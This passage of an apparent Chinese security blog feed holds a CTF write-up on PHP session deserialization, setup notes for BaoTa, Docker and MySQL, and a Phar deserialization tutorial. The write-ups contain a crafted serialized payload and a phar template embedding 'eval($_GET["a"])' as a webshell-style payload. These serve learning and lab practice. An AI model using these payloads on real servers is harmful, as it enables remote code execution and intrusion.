会话，默认是使用<code>php</code>的方式，有一个<code>Flag</code>的类，其中有两个属性分别是<code>name</code>和<code>her</code>，在发序列化时会触发<code>__wakeup</code>魔术方法，先给<code>her</code>赋值为一个随机的1到10000的MD5值，并和<code>name</code>进行比较，条件满足就会包含<code>flag.php</code>页面，并输出flag，但是在这个页面中没有输入点</li><li>在<code>hint.php</code>页面中，声明了session的存储方式为<code>php_serialize</code>，并可以提交GET参数<code>a</code>，有输入的地方</li></ul><p>在这题中，满足了可以在<code>hint.php</code>页面中写入，可以在<code>index.php</code>页面中读取，并且两个页面的存储方式不一样，说明存在有session反序列化漏洞</p><p>要想读取flag，就要满足<code>name</code>和<code>her</code>的值相等，可以使用取地址符<code>&amp;</code>满足这个条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;name = &amp;<span class="hljs-variable">$a</span>-&gt;her;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200436497.png" alt="image-20250420200436497"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 序列化后的结果</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;her&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><p>在<code>hint.php</code>页面提交GET参数a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=|O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;her&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200809940.png" alt="image-20250420200809940"></p><p>然后直接访问<code>index.php</code>页面就可以得到flag了</p><p><img src="/2025/04/25/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420200826403.png" alt="image-20250420200826403"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞笔记</category>
      
      <category>PHP反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Session反序列化 学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Ubuntu部署宝塔</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/</url>
    
    <content type="html"><![CDATA[<p>网址：<a href="https://www.bt.cn/new/download.html">https://www.bt.cn/new/download.html</a></p><p>安装命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> [ -f /usr/bin/curl ];<span class="hljs-keyword">then</span> curl -sSO https://download.bt.cn/install/install_panel.sh;<span class="hljs-keyword">else</span> wget -O install_panel.sh https://download.bt.cn/install/install_panel.sh;<span class="hljs-keyword">fi</span>;bash install_panel.sh ed8484bec<br></code></pre></td></tr></table></figure><p>最后会得到宝塔面板登录信息</p><p>可以使用命令进行修改配置</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bt</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2%E5%AE%9D%E5%A1%94/image-20250424114554547.png" alt="image-20250424114554547"></p><p>然后输入命令编号即可，习惯修改以下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">5修改面板密码<br>6修改面板用户名<br>8修改面板端口<br>28修改面板安全入口<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在kali部署docker和docker-compose</title>
    <link href="/2025/04/25/%E5%9C%A8kali%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose/"/>
    <url>/2025/04/25/%E5%9C%A8kali%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose/</url>
    
    <content type="html"><![CDATA[<p>更新系统包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure><p>安装docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-cli<br></code></pre></td></tr></table></figure><p>验证是否安装成功（拉取hello-word镜像）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run hello-world<br></code></pre></td></tr></table></figure><p>安装docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-compose<br></code></pre></td></tr></table></figure><p>出现报错，有无法下载的就加命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-compose --fix-missing<br></code></pre></td></tr></table></figure><p>更换docker镜像源（一键搞好）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;registry-mirrors&quot;: [</span><br><span class="hljs-string">        &quot;https://hub.uuuadc.top&quot;,</span><br><span class="hljs-string">        &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.icu&quot;,</span><br><span class="hljs-string">        &quot;https://docker.ckyl.me&quot;,</span><br><span class="hljs-string">        &quot;https://docker.awsl9527.cn&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://docker.laoex.link&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://noohub.ru&quot;,</span><br><span class="hljs-string">        &quot;https://huecker.io&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.timeweb.cloud&quot;,</span><br><span class="hljs-string">        &quot;https://docker.rainbond.cc&quot;,</span><br><span class="hljs-string">        &quot;https://docker.1panel.live&quot;,</span><br><span class="hljs-string">        &quot;https://hub.rat.dev&quot;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><p>docker命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看已有镜像</span><br>docker images<br><br><span class="hljs-comment"># 查看正在运行的容器</span><br>docker ps<br><br><span class="hljs-comment"># 查看所有容器</span><br>docker ps -a<br><br><span class="hljs-comment"># 构建镜像</span><br>docker build -t 镜像名字 .<br><br><span class="hljs-comment"># 运行镜像</span><br>docker run -itd -p &lt;主机端口&gt;:&lt;容器端口&gt; --name &lt;容器名字&gt; &lt;镜像名字&gt;<br>如：docker run -itd -p 2323:8080 --name crazy crazy:latest<br>docker run -it &lt;容器ID&gt; /bin/sh<br><br><span class="hljs-comment"># 以 /bin/sh 权限进入容器交互界面</span><br>docker <span class="hljs-built_in">exec</span> -it &lt;容器ID&gt; /bin/sh<br><br><span class="hljs-comment"># 启动容器</span><br>docker start &lt;容器名或ID&gt;<br><br><span class="hljs-comment"># 暂停容器</span><br>docker stop &lt;容器名或ID&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Ubuntu部署MySQL</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2MySQL/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2MySQL/</url>
    
    <content type="html"><![CDATA[<p>更新软件包列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure><p>安装 MySQL 服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install mysql-server<br></code></pre></td></tr></table></figure><p>启动MySQL服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl start mysql<br></code></pre></td></tr></table></figure><p>设置开机自启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> mysql<br></code></pre></td></tr></table></figure><p>检查MySQL服务状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl status mysql<br></code></pre></td></tr></table></figure><p>运行安全脚本，可以设置 root 密码、移除匿名用户、禁止 root 远程登录、移除测试数据库等</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql_secure_installation<br></code></pre></td></tr></table></figure><p>登录MySQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql -u root<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Ubuntu部署docker和docker-compose和使用命令</title>
    <link href="/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose%E5%92%8C%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2025/04/25/%E5%9C%A8Ubuntu%E9%83%A8%E7%BD%B2docker%E5%92%8Cdocker-compose%E5%92%8C%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>更新系统包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure><p>安装docker（版本为 26.1.3<del>ubuntu1</del>24.04.1）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker.io<br></code></pre></td></tr></table></figure><p>验证是否安装成功（拉取hello-word镜像）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run hello-world<br></code></pre></td></tr></table></figure><p>安装docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-compose<br></code></pre></td></tr></table></figure><p>更换docker镜像源（一键搞好）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;registry-mirrors&quot;: [</span><br><span class="hljs-string">        &quot;https://hub.uuuadc.top&quot;,</span><br><span class="hljs-string">        &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.icu&quot;,</span><br><span class="hljs-string">        &quot;https://docker.ckyl.me&quot;,</span><br><span class="hljs-string">        &quot;https://docker.awsl9527.cn&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://docker.laoex.link&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://noohub.ru&quot;,</span><br><span class="hljs-string">        &quot;https://huecker.io&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.timeweb.cloud&quot;,</span><br><span class="hljs-string">        &quot;https://docker.rainbond.cc&quot;,</span><br><span class="hljs-string">        &quot;https://docker.1panel.live&quot;,</span><br><span class="hljs-string">        &quot;https://hub.rat.dev&quot;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><p>docker命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看已有镜像</span><br>docker images<br><br><span class="hljs-comment"># 查看正在运行的容器</span><br>docker ps<br><br><span class="hljs-comment"># 查看所有容器</span><br>docker ps -a<br><br><span class="hljs-comment"># 构建镜像</span><br>docker build -t 镜像名字 .<br><br><span class="hljs-comment"># 运行镜像</span><br>docker run -itd -p &lt;主机端口&gt;:&lt;容器端口&gt; --name &lt;容器名字&gt; &lt;镜像名字&gt;<br>如：docker run -itd -p 2323:8080 --name crazy crazy:latest<br>docker run -it &lt;容器ID&gt; /bin/sh<br><br><span class="hljs-comment"># 以 /bin/sh 权限进入容器交互界面</span><br>docker <span class="hljs-built_in">exec</span> -it &lt;容器ID&gt; /bin/sh<br><br><span class="hljs-comment"># 启动容器</span><br>docker start &lt;容器名或ID&gt;<br><br><span class="hljs-comment"># 暂停容器</span><br>docker stop &lt;容器名或ID&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Phar反序列化</title>
    <link href="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是Phar"><a href="#什么是Phar" class="headerlink" title="什么是Phar"></a>什么是<code>Phar</code></h1><p>JAR 是开发 Java 程序一个应用，包括所有的可执行、可访问的文件，都打包进了一个 JAR 文件里，使得部署过程十分简单</p><p><code>phar</code>是 PHP 里类似于 JAR 的一种打包文件，说白了其本质可以理解为一个压缩包</p><p>对于 PHP 5.3 或更高版本，<code>phar</code>后缀文件时默认开启支持的，可以直接使用</p><p>一般使用文件包含中的**<code>phar</code>伪协议<strong>进行读取</strong><code>.phar</code>文件**</p><h1 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a><code>Phar</code>文件结构</h1><ul><li>**<code>stub phar：</code>**这是<code>phar</code>文件标识，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>（头部信息），这是 PHAR 文件的入口点，当 PHP 解释器加载 PHAR 文件时，会首先执行 Stub 代码</li><li><strong><code>manifest：</code><strong>压缩文件的属性等信息，以</strong>序列化</strong>方式存储</li><li>**<code>contents：</code>**压缩文件的内容</li><li>**<code>signature：</code>**签名，放在文件末尾</li></ul><p><strong><code>phar</code>协议</strong>解析文件时，会自动触发对**<code>manifest</code>字段<strong>的</strong>序列化字符串<strong>进行</strong>反序列化**</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420202950641.png" alt="image-20250420202950641"></p><p>以下是官方文档，红框部分是要进行利用的序列化部分</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250420203104476.png" alt="image-20250420203104476"></p><p><strong><code>phar</code>文件的压缩和解压缩</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 压缩</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test2.phar&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;test2.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">buildfromDirectory</span>(<span class="hljs-string">&#x27;f:\0Day&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setDefaultStub</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test.txt&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong><code>Phar</code>类：</strong><code>Phar</code>是 PHP 内置的一个类，用于创建、操作和管理 PHAR 文件</li><li>**<code>$phar = new Phar(&#39;test2.phar&#39;,0,&#39;test2.phar&#39;);</code>**第一个参数<code>test2.phar</code>是创建的 PHAR 文件名，如果文件不存在会创建一个新的文件，如果文件存在并允许进行修改，会对其进行更新；第二个参数<code>0</code>表示文件创建的标志，实际应用中会使用如：<code>Phar::CREATE</code>表示创建新的 PHAR 文件，来指定不同的创建模式；第三个参数<code>test2.phar</code>指定 PHAR 文件的别名，可以在后续中引用该 PHAR 文件时使用</li><li>**<code>$phar-&gt;buildfromDirectory(&#39;f:\0Day&#39;);</code>**指定要打包的目录路径</li><li>**<code>$phar-&gt;setDefaultStub(&#39;test.txt&#39;,&#39;test.txt&#39;);</code>**中<code>setDefaultStub</code>用于为 PHAR 文件设置默认的 Stub，即默认入口；第一个参数<code>test.txt</code>是入口文件的路径，第二个参数 <code>&#39;test.txt&#39;</code> 是内部文件的路径</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 解压缩</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>**<code>$phar = new Phar(&#39;test.phar&#39;);</code>**通过 <code>new Phar(&#39;test.phar&#39;)</code> 语句，程序尝试打开名为 <code>test.phar</code> 的 Phar 压缩包文件，并将其封装成一个 <code>Phar</code> 对象存储在变量 <code>$phar</code> 中。如果 <code>test.phar</code> 文件不存在，会报错</li><li>**<code>$phar-&gt;extractTo(&#39;test&#39;);</code>**调用 <code>Phar</code> 对象的 <code>extractTo</code> 方法，该方法的作用是将 Phar 压缩包中的所有内容提取到指定的目录；参数 <code>&#39;test&#39;</code> 是目标目录，即 Phar 压缩包中的文件和目录会被解压到名为 <code>test</code> 的目录下。如果该目录不存在，PHP 会尝试创建它；若已存在，则会将文件解压到该目录内</li></ul><h2 id="创建一个-phar文件的模板"><a href="#创建一个-phar文件的模板" class="headerlink" title="创建一个.phar文件的模板"></a>创建一个<code>.phar</code>文件的模板</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>具体解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 删除之前的test.par文件(如果有)</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 创建一个phar对象，文件名必须以 .phar 为后缀</span><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-comment"># 开始写文件</span><br><span class="hljs-comment"># 调用startBuffering()这个函数意味着后续的写入操作不会立即将数据写入文件，而是先存储在缓冲区中，直到调用stopBuffering()方法</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-comment"># 写入stub（是 Phar 文件的入口点，当 Phar 文件被执行时，首先会执行 stub 中的代码）</span><br><span class="hljs-comment"># 括号中的代码是默认的，是一个特殊的 PHP 指令，用于停止 PHP 代码的编译，后面的数据会被当作二进制数据处理</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-comment"># 要写入文件中的部分</span><br><span class="hljs-comment"># 创建一个 Testobj 类的对象 $o</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-comment"># 设置output属性的内容</span><br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><br><span class="hljs-comment"># 调用 setMetadata 方法，将 $o 对象作为元数据写入 Phar 文件中（写入meta-data）</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment"># 将字符串 &quot;test&quot; 作为文件内容，以 test.txt 为文件名添加到 Phar 压缩包中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># 停止写入文件</span><br><span class="hljs-comment"># 调用 stopBuffering 方法，停止缓冲，并将缓冲区中的数据写入到 test.phar 文件中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="Phar反序列化漏洞原理"><a href="#Phar反序列化漏洞原理" class="headerlink" title="Phar反序列化漏洞原理"></a><code>Phar</code>反序列化漏洞原理</h1><p><code>manifest</code>压缩文件的属性等信息，以序列化存储，存在一段序列化的字符串</p><p>调用<code>phar</code>伪协议，可读取<code>.phar</code>文件</p><p><code>phar</code>协议解析文件时，会自动触发对<code>manifest</code>字段的序列化字符串进行反序列化</p><p><code>phar</code>需要满足 PHP &gt;&#x3D; 5.2，在<code>php.ini</code>中将<code>phar.readonly</code>设为<code>Off</code></p><p>以下是这个漏洞受到影响的函数（即可以使用<code>phar</code>伪协议读取<code>.phar</code>文件的函数）</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175359494.png" alt="image-20250421175359494"></p><h3 id="具体题目解析"><a href="#具体题目解析" class="headerlink" title="具体题目解析"></a>具体题目解析</h3><p>第一个是漏洞页面<code>index.php</code>，源码如下</p><p><img src="/2025/04/25/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250421175611356.png" 